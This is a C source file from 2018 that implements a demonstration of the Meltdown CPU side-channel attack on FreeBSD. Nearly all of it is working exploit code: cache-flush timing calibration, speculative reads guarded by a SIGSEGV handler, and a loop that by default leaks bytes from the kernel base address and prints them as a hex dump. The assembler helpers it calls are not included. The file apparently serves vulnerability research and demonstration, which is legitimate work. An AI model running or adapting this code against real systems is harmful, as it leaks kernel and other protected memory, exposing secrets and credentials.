/*-
 * Copyright (c) 2018 The University of Oslo
 * Copyright (c) 2018 Dag-Erling Smørgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Demonstration of the Meltdown attack on FreeBSD
 *
 * https://meltdownattack.com/
 */

#include <sys/mman.h>

#include <err.h>
#include <limits.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*
 * Assembler functions
 */
void clflush(const void *addr);
uint64_t rdtsc64(void);
uint32_t rdtsc32(void);
uint64_t timed_read(const void *);
void spec_read(const uint8_t *addr, const uint8_t *probe, unsigned int shift);

/*
 * Kernel base address for a few platforms
 */
#if __amd64__
#define KERNBASE	0xffffffff80000000UL
#elif __i386__
#define KERNBASE	0xc0000000U
#else
#error "Unsupported architecture"
#endif

/*
 * Address and length of data to read
 */
static uint8_t *atk_addr;
static size_t atk_len;
static unsigned int atk_rounds;
#define DFLT_ATK_ADDR	((uint8_t *)KERNBASE)
#define DFLT_ATK_LEN	16
#define DFLT_ATK_ROUNDS	3

/*
 * Probe array
 */
#define PROBE_SHIFT	12
#define PROBE_LINELEN	(1 << PROBE_SHIFT)
#define PROBE_NLINES	256
#define PROBE_SIZE	(PROBE_NLINES * PROBE_LINELEN)
static uint8_t *probe;

/*
 * Average measured read latency with cold and hot cache
 */
static uint64_t avg_cold;
static uint64_t avg_hot;

/*
 * Decision threshold
 */
static uint64_t threshold;

/*
 * Self-test
 */
static uint8_t selftest[4096];

/*
 * Map our probe array between two guard regions to be absolutely sure
 * that it is not adjacent to memory in use elsewhere in the program.
 */
#ifndef MAP_GUARD
#define MAP_GUARD	MAP_ANON
#endif
static void
init_probe(void)
{

	if (mmap(NULL, PROBE_SIZE, PROT_NONE, MAP_GUARD, -1, 0) == MAP_FAILED)
		err(1, "mmap()");
	probe = mmap(NULL, PROBE_SIZE, PROT_READ | PROT_WRITE,
	    MAP_ANON | MAP_PRIVATE, -1, 0);
	if (probe == MAP_FAILED)
		err(1, "mmap()");
	memset(probe, 0xff, PROBE_SIZE);
	if (mmap(NULL, PROBE_SIZE, PROT_NONE, MAP_GUARD, -1, 0) == MAP_FAILED)
		err(1, "mmap()");
}

/*
 * Compute the average hot and cold read latency and derive the decision
 * threshold.
 */
#define CAL_ROUNDS	1048576
static void
calibrate(void)
{
	uint8_t *addr;
	uint64_t meas, min, max, sum;
	unsigned int i;

	warnx("calibrating...");

	/* compute average latency of "cold" access */
	min = UINT64_MAX;
	max = 0;
	sum = 0;
	for (i = 0, addr = probe; i < CAL_ROUNDS + 2; ++i) {
		addr = probe + (i % PROBE_NLINES) * PROBE_LINELEN;
		clflush(addr);
		meas = timed_read(addr);
		if (meas < min)
			min = meas;
		if (meas > max)
			max = meas;
		sum += meas;
	}
	sum -= min;
	sum -= max;
	avg_cold = sum / CAL_ROUNDS;
	warnx("average cold read: %llu", (unsigned long long)avg_cold);

	/* compute average latency of "hot" access */
	meas = timed_read(probe);
	min = UINT64_MAX;
	max = 0;
	sum = 0;
	for (i = 0; i < CAL_ROUNDS + 2; ++i) {
		addr = probe + (i % PROBE_NLINES) * PROBE_LINELEN;
		meas = timed_read(addr);
		if (meas < min)
			min = meas;
		if (meas > max)
			max = meas;
		sum += meas;
	}
	sum -= min;
	sum -= max;
	avg_hot = sum / CAL_ROUNDS;
	warnx("average hot read: %llu", (unsigned long long)avg_hot);

	/* set decision threshold to sqrt(hot * cold) */
	if (avg_hot >= avg_cold)
		errx(1, "hot read is slower than cold read!");
	for (threshold = avg_hot; threshold <= avg_cold; threshold++)
		if (threshold * threshold >= avg_hot * avg_cold)
			break;
	warnx("threshold: %llu", (unsigned long long)threshold);
}

/*
 * Print a pretty hex dump of the specified buffer.
 */
static void
hexdump(size_t base, const uint8_t *buf, size_t len)
{
	unsigned int i;
	ssize_t res;

	res = len;
	while (res > 0) {
		printf("%08zx ", base);
		for (i = 0; i < 16; ++i) {
			if (i == 8)
				printf(" :");
			if (i < res)
				printf(" %02x", buf[i]);
			else
				printf(" --");
		}
		printf(" |");
		for (i = 0; i < 16; ++i) {
			if (i == 8)
				printf(":");
			if (i < res)
				printf("%c", (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.');
			else
				printf("-");
		}
		printf("|\n");
		res -= 16;
		buf += 16;
	}
}

/*
 * Perform the Meltdown attack.
 *
 * For each byte in the specified range:
 * - Flush the cache.
 * - Read the given byte, then touch a specific probe address based on its
 *   value of the byte that was read.
 * - Measure the time it takes to access each probe address.
 * - In theory, one of the probe addresses should be in cache, while the
 *   others should not.  This indicates the value of the byte that was
 *   read.
 */
static sigjmp_buf jmpenv;
static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
static void
meltdown(void)
{
	unsigned int hist[PROBE_NLINES];
	uint8_t line[16];
	sig_t sigsegv;
	unsigned int i, r, v, xv;
	int signo;
	uint8_t b;

	warnx("reading %zu bytes from %p with %u rounds",
	    atk_len, atk_addr, atk_rounds);
	sigsegv = signal(SIGSEGV, sighandler);
	for (i = 0; i < atk_len; ++i) {
		memset(hist, 0, sizeof hist);
		/*
		 * In each round, flush the cache, try to access the
		 * target and record what we think its value is based on
		 * which cache lines are hot after the speculative read.
		 */
		for (r = 0; r < atk_rounds; ++r) {
			if ((signo = sigsetjmp(jmpenv, 1)) == 0) {
				for (v = 0; v < PROBE_NLINES; ++v)
					clflush(&probe[v * PROBE_LINELEN]);
				spec_read(&atk_addr[i], probe, PROBE_SHIFT);
			}
			for (v = 0; v < PROBE_NLINES; ++v) {
				xv = ((v * 167) + 13) % 256; /* dodge run detection */
				if (timed_read(&probe[xv * PROBE_LINELEN]) < threshold)
					hist[xv]++;
			}
		}
		/* retain the most frequent value */
		for (b = 0, v = 0; v < PROBE_NLINES; ++v)
			if (hist[v] > hist[b])
				b = v;
		line[i % 16] = b;
		/* output 16 bytes at a time */
		if (i % 16 == 15)
			hexdump(i - 15, line, 16);
	}
	/* output any leftovers */
	if (i % 16 > 0)
		hexdump(i - i % 16, line, i % 16);
	signal(SIGSEGV, sigsegv);
}

/*
 * Print usage string and exit.
 */
static void
usage(void)
{

	fprintf(stderr, "usage: meltdown [-a addr | -s] [-l len] [-n rounds]\n");
	exit(1);
}

int
main(int argc, char *argv[])
{
	char *end;
	uintmax_t umax;
	unsigned int i;
	int opt;

	while ((opt = getopt(argc, argv, "a:l:n:s")) != -1)
		switch (opt) {
		case 'a':
			if (atk_addr != 0)
				usage();
			umax = strtoull(optarg, &end, 16);
			if (end == optarg || *end != '\0')
				errx(1, "invalid address");
			atk_addr = (uint8_t *)umax;
			if ((uintmax_t)atk_addr != umax)
				errx(1, "address is out of range");
			break;
		case 'l':
			if (atk_len != 0)
				usage();
			umax = strtoull(optarg, &end, 0);
			if (end == optarg || *end != '\0')
				errx(1, "invalid length");
			atk_len = umax;
			if (atk_len == 0 || (uintmax_t)atk_len != umax)
				errx(1, "length is out of range");
			break;
		case 'n':
			if (atk_rounds != 0)
				usage();
			umax = strtoull(optarg, &end, 0);
			if (end == optarg || *end != '\0')
				errx(1, "invalid round count");
			atk_rounds = umax;
			if (atk_rounds == 0 || (uintmax_t)atk_rounds != umax)
				errx(1, "round count is out of range");
			break;
		case 's':
			if (atk_addr != 0)
				usage();
			atk_addr = selftest;
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc)
		usage();

	/* default address and length */
	if (atk_addr == 0)
		atk_addr = DFLT_ATK_ADDR;
	if (atk_len == 0)
		atk_len = DFLT_ATK_LEN;
	if (atk_rounds == 0)
		atk_rounds = DFLT_ATK_ROUNDS;

	/* generate self-test data if required */
	if (atk_addr == selftest) {
		for (i = 0; i < sizeof selftest; ++i)
			selftest[i] = '!' + i % ('~' - '!' + 1);
		if (atk_len > sizeof selftest)
			atk_len = sizeof selftest;
	}

	/* create the probe array and ensure that it is paged in */
	init_probe();

	/* calibrate our timer */
	calibrate();

	/* perform the attack */
	meltdown();

	exit(0);
}
